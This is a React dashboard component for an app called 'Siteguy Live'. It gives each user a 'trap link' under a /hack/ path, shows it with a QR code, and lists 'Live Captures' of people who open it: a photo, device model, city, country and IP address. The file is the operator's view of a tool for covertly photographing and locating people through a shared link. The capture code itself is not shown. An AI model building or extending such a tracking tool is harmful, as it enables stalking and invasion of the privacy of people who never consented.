import { useEffect, useState } from 'react';
import { supabase } from '../utils/supabase';
import QRCode from 'qrcode.react';

const Dashboard = () => {
  const [uniqueId, setUniqueId] = useState(null);
  const [captures, setCaptures] = useState([]);

  useEffect(() => {
    const init = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data: profile } = await supabase.from('profiles').select('unique_id').eq('id', user.id).single();
        if (profile) {
          setUniqueId(profile.unique_id);
          const { data } = await supabase.from('captures').select('*').eq('user_id', profile.unique_id).order('created_at', { ascending: false });
          setCaptures(data || []);
        }
      }
    };
    init();
  }, []);

  const trapLink = `${window.location.origin}/hack/${uniqueId}`;

  return (
    <div className="p-8 bg-gray-950 min-h-screen">
      <div className="flex justify-between mb-8">
        <h1 className="text-2xl font-bold">Siteguy Live</h1>
        <button onClick={() => supabase.auth.signOut()} className="text-red-500">Logout</button>
      </div>
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        <div className="bg-gray-900 p-6 rounded-2xl border border-gray-800">
          <p className="text-xs text-gray-500 mb-2">YOUR TRAP LINK</p>
          <p className="text-xs font-mono text-green-400 mb-4 break-all">{trapLink}</p>
          <div className="bg-white p-2 rounded-lg w-max mx-auto"><QRCode value={trapLink} size={120} /></div>
        </div>
        <div className="lg:col-span-2 space-y-4">
          <h2 className="font-bold">Live Captures ({captures.length})</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {captures.map(c => (
              <div key={c.id} className="bg-gray-900 rounded-xl overflow-hidden border border-gray-800">
                <img src={c.image_url} className="w-full h-40 object-cover" />
                <div className="p-4 text-xs">
                  <p>Device: {c.device_model}</p>
                  <p>Location: {c.location_city}, {c.location_country}</p>
                  <p className="text-gray-500 mt-1">IP: {c.ip_address}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};
export default Dashboard;
